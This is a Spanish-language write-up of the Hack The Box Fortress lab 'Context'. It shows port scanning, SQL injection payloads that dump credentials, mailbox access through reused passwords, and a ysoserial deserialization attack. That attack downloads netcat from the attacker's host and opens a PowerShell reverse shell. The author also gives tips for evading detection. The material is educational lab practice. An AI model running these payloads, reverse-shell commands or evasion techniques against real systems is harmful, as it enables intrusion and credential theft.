---
layout: single
title: Context - Hack The Box
excerpt: "Context es una máquina de la sección Fortress de Hack The Box."
date: 2022-09-10
classes: wide
header:
  teaser: /assets/images/writeup-context/context.PNG
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - HTB
  - TCP
  - 
---

![](/assets/images/writeup-context/context2.jpg)

Context es una máquina de la sección Fortress de Hack The Box en la que se pueden hackear un montón de cosas, así podemos practicar un montón de técnicas distintas en la misma máquina.

## PORT SCAN

TCP:

(Por cierto, que en los writeups anteriores no lo puse y quizás es interesante. No tomo `medidas de seguridad` para hacer `menos ruido` y ser `menos detectable` porque es un CTF, pero sino, lo primero seria que el parámetro `-T 5` obviamente seria entre `-T 0` a `-T 3` y `fragmentaria` los paquetes en `paquetes de 8 bites` que se irían mandando poco a poco con el parámetro `-ff` (a la vez que haria uso de una `vpn` o `vps` para cambiarme la ip) `ESTO SE APLICA A TODOS LOS ESCANEOS PERO CON PARÁMETROS DISTINTOS`)

```
 > nmap -sV -sC -Pn -T5 -n --open 10.13.37.12

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 19:29 CEST
Nmap scan report for 10.13.37.12
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
443/tcp  open  ssl/https
|_http-title: Home page - Home
| ssl-cert: Subject: commonName=WMSvc-SHA2-WEB
| Not valid before: 2020-10-12T18:31:49
|_Not valid after:  2030-10-10T18:31:49
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-ntlm-info: 
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|_  Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-10T17:30:25+00:00
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Not valid before: 2022-06-01T08:57:37
|_Not valid after:  2022-12-01T08:57:37
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.13.37.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 9s, deviation: 0s, median: 8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.48 seconds
```

El puerto `443/tcp` está abierto, y tiene corriendo el servicio `open ssl` es decir que es una `web https`.

También vemos que hay una `Base de datos` en el puerto `1433/tcp` y viendo que tanto en ese puerto como en los siguientes está corriendo un servicio de `Microsoft` da a entender que la máquina es `Windows`, pero eso lo comprobaremos más adelante.

Y también vemos que hay un servidor corriendo en el puerto `3389/tcp` por lo que probablemente es otra `web`.

OS:

Ya hemos visto que probablemente será una máquina `Windows`, pero vamos a comprobarlo. Para esto vamos a mandarle una `traza ICMP` y según el `ttl` de la respuesta vamos a saber que `sistema operativo` tiene.

```
❯ ping -c 1 10.13.37.12

PING 10.13.37.12 (10.13.37.12) 56(84) bytes of data.
64 bytes from 10.13.37.12: icmp_seq=1 ttl=127 time=105 ms

--- 10.13.37.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.403/105.403/105.403/0.000 ms
```

Vemos que el ttl = 127 aunque en la realidad es `ttl = 128` porque la conexión no es directa, sino que pasa por un host intermediario, lo cual le quita uno de ttl. Por lo que podemos saber que estamos ante una máquina `Windows`.

(También he hecho un escaneo de los puertos que hay por el protocolo UDP, pero como no hay ningún puerto abierto he decidido no ponerlo aquí ya que no es interesante)

(Y no voy a probar el eternalblue, ya que nmap no lo detecta y al ser un fortress dudo que sea un windows antiguo)

## PUERTO 443

Si vamos a la web encontramos esto:

![](/assets/images/writeup-context/web-1.PNG)

Si clicamos donde pone lo de contacto, cuando nos redirija encontraremos que hace mención a un login de admin, y así podemos encontrar ese login que veremos más tarde.

Volviendo a la página principal no encontramos gran cosa, pero primero vamos a ver el `código` de la página, a ver si encontramos algo interesante o `virtual host routing` es decir, que haya varios servidores en el mismo host... Pero no encontramos gran cosa. Lo que si, si nos fijamos, la mayoría de cosas están en un directorio `/Home` por lo que vamos a hacer `wfuzzing` a ese directorio para ver que encontramos.

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.13.37.12/Home/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.13.37.12/Home/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000042:   200        99 L     209 W      2883 Ch     "products"
000000029:   200        59 L     245 W      2455 Ch     "privacy"
000000025:   200        63 L     145 W      2070 Ch     "contact"
000000245:   200        74 L     177 W      2137 Ch     "staff"
000000592:   200        63 L     145 W      2070 Ch     "Contact"
000000496:   200        99 L     209 W      2883 Ch     "Products"
000000616:   200        59 L     245 W      2455 Ch     "Privacy"
000000659:   200        78 L     232 W      2548 Ch     "Index"
000002614:   200        74 L     177 W      2137 Ch     "Staff"
000005085:   200        78 L     232 W      2548 Ch     "INDEX"
000023314:   200        63 L     145 W      2070 Ch     "CONTACT"
000043401:   200        59 L     245 W      2455 Ch     "PRIVACY"                                                                 
000071101:   200        99 L     209 W      2883 Ch     "PRODUCTS"  
```

Principalmente, me llama la atención el directorio `/Home/staff` vamos y vemos unos cuantos nombres que probablemente nos sirvan para `usernames` en algún lado.

![](/assets/images/writeup-context/web-staff.PNG)

También si vamos al `código` no encontramos gran cosa. Pero lo que sí que encontramos es la primera FLAG: `CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}`

![](/assets/images/writeup-context/web-code.PNG)

A demás, vemos que un poco más abajo hace referencia al directorio `/Admin` que para entrar nos tenemos que loguear (no nos hace un redirect, por lo que `no parece vulnerable a Idor`) pero antes de probar algunos ataques como `Idor` o `SQLi` nos podemos fijar en otra cosa. En el mismo mensaje donde está la flag también encontramos unas credenciales `jay.teignton:admin` así que vamos a probarlas.

Y nos las acepta, no sé porque me ha hecho un redirect a la página principal, pero voy a `/Admin` y ya me manda para `/Admin/Management`. Pues ya estamos dentro, si fuese un CTF normal aquí seria donde habría que buscar una forma de mandarnos una reverse shell, pero es un Fortress así que no creo que todavía se pueda.

Pues asi lo primero que me llama la atención es que podemos añadir cosas, así que lo primero que voy a intentar sera una `SQL injection`. 

```
'+(select db_name())+'
```

![](/assets/images/writeup-context/admin-sqli-1.PNG)

Y vemos que es vulnerable y nos muestra el nombre de la base de datos:

![](/assets/images/writeup-context/admin-sqli-2.PNG)

Por lo que si seguimos enumerando la base de datos nos encontramos la `tabla users`:

```
'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'
```

![](/assets/images/writeup-context/admin-sqli-3.PNG)

Ahora si dumpeamos el `campo user` tendremos un usuario. Y si luego hacemos lo mismo con el `campo password` ya tendremos unas `credenciales validas`.

```
'+(select top 1 username from users order by username)+'

'+(select top 1 password from users order by username)+'
```

![](/assets/images/writeup-context/admin-sqli-4.PNG)

![](/assets/images/writeup-context/admin-sqli-5.PNG)

Y tambien de la misma forma podemos encontrar una FLAG: `CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}`

```
'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'
```

![](/assets/images/writeup-context/admin-sqli-6.PNG)

Haciendo `Wfuzzing` a la web principal (osea al directorio principal `https://10.13.37.12/`) encontramos el directorio `/owa` que parece un servidor de `outlook` y hay un loguin, por lo que podemos probar con las credenciales que ya tenemos: usuario `abbie.buckfast` y la contraseña `AMkru$3_f'/Q^7f?`

![](/assets/images/writeup-context/owa-1.PNG)

Y nos da acceso.

Una vez hemos entrado, en la parte superior derecha hay un icono de usuario, clicamos y ahí nos podemos cambiar a `otro buzón`, entonces clicamos ahí y luego con tal de poner una letra y darle a autocompletar vemos `otro usuario`:

![](/assets/images/writeup-context/owa-2.PNG)

Le damos y nos deja entrar `sin proporcionar contraseña`.

Ahora si miramos en mensajes enviados podemos entontrar otra FLAG: `CONTEXT{wh00000_4re_y0u?}`

Además en inbox podemos ver un mensaje y un `zip` que podemos descargar:

![](/assets/images/writeup-context/owa-3.PNG)

Después de descargar y unzipear el archivo en una carpeta podemos ver un `_ViewStart.cshtml`. Analizando el contenido podemos pensar en un ataque de `deseralización en la cookie Profile`.

```
❯ cat _ViewStart.cshtml

@{
    Layout = "~/Views/Shared/_Layout.cshtml";
}

@using System.Text;
@using System.Web.Script.Serialization;
@{ 
    if (0 != Context.Session.Keys.Count) {
        if (null != Context.Request.Cookies.Get("Profile")) {
            try {
                byte[] data = Convert.FromBase64String(Context.Request.Cookies.Get("Profile")?.Value);
                string str = UTF8Encoding.UTF8.GetString(data);

                SimpleTypeResolver resolver = new SimpleTypeResolver();
                JavaScriptSerializer serializer = new JavaScriptSerializer(resolver);

                object obj = (serializer.Deserialize(str, typeof(object)) as Profile);
                // TODO: create profile to change the language and font of the website 
            } catch (Exception e) {
            }
        }
    }
}
```

Con ayuda de `ysoserial` crearemos una data serializada que nos descargue el `netcat.exe`

```
pc1@windows C:\CTF\ysoserial> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.13.14.7/netcat.exe -o C:\ProgramData\netcat.exe"

ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMy4xNC4xMC9uZXRjYXQuZXhlIC1vIEM6XFxQcm9ncmFtRGF0YVxcbmV0Y2F0LmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=

pc1@windows C:\CTF\ysoserial>
```

Iniciamos sesión de nuevo en /Admin y con `EditThisCookie` o desde las `herramientas de desarrollador` nos cambiamos la cookie Profile a una con la data serializada.

Guardamos la cookie y al recargar no llega la petición de descarga de netcat:

```
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.13.37.12 - - "GET /netcat.exe HTTP/1.1" 200 -
```

Ahora creamos una data para invocar el netcat y enviarnos una `reverse shell`:

(siempre lo explico, pero por si acaso: nos mandamos la `reverse shell` por el puerto `443`, ya que es un puerto por el que normalmente se tramita información, por lo tanto, muchas veces los `sistemas de seguridad` no suelen prestarle mucha atención a la información que se tramita por ese puerto y de esa forma podemos ser un poco `menos detectables)

```
pc1@windows C:\CTF\ysoserial> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\netcat.exe -e powershell 10.13.14.7 443"
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxuZXRjYXQuZXhlIC1lIHBvd2Vyc2hlbGwgMTAuMTMuMTQuMTAgNDQzJw0KICAgICAgICB9DQogICAgfQ0KfQ==
pc1@Windows C:\CTF\ysoserial>
```

Cambiamos la cookie y al recargar esta vez nos llega una shell y ya podemos ver otra FLAG: `CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}`

```
❯ sudo netcat -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.13.37.12
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Windows\system32> whoami
teignton\web_user
PS C:\Windows\system32> type C:\Users\Public\flag.txt
CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
PS C:\Windows\system32>
```

Mirando los `logs de webdb` podemos encontrar unas `credenciales en texto claro`:

```
PS C:\Logs\WEBDB> type log_13.trc | Select-String TEIGNTON
????????? ??? ?????? ?????????? ??????? TEIGNTON\karl.memaybe
????????? ??? ?????? ?????????? ??????? B6rQx_d&RVqvcv2A
PS C:\Logs\WEBDB>
```

Si probamos conectarnos con `sqsh` a `mssql` con las credenciales, nos podemos conectar:

```
❯ sqsh -S 10.13.37.12:1433 -U teignton\\karl.memaybe -P 'B6rQx_d&RVqvcv2A'
Copyright (C) 1995-2001 Scott C. Gray
1>
```

Si enumeramos un poco podemos ver la `base de datos clients`:

```
1> select * from openquery("web\clients", 'select name from master..sysdatabases');
2> go
master
tempdb
model
msdb
clients
(5 rows affected)
1>
```

Seguimos enumerando la base de datos y encontramos `card_details`:

```
1> select * from openquery("web\clients", 'select name from clients..sysobjects');
2> go
BackupClients
card_details
QueryNotificationErrorsQueue
queue_messages_1977058079
EventNotificationErrorsQueue
queue_messages_2009058193
ServiceBrokerQueue
queue_messages_2041058307
(8 rows affected)
1>
```

Si enviamos su contenido a un txt y despues lo cateamos podemos ver la FLAG: `CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}`

```
1> select * from openquery("web\clients", 'select * from clients..card_details');
2> go > out.txt
1> exit
❯ cat out.txt | grep CONTEXT
CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}
```

También encontramos un `binario` que despues de bajarlo podemos ver que es un `dll`.

```
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > text
1> exit
❯ cat text | base64 -d > out
❯ file out
out: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Revisando con ayuda de `dnSpy` las funciones podemos ver `BackupClients`:

![](/assets/images/writeup-context/dnSpy1.png)

Dentro podemos ver `credenciales` entonces simplemente nos conectamos:

![](/assets/images/writeup-context/dnSpy2.png)

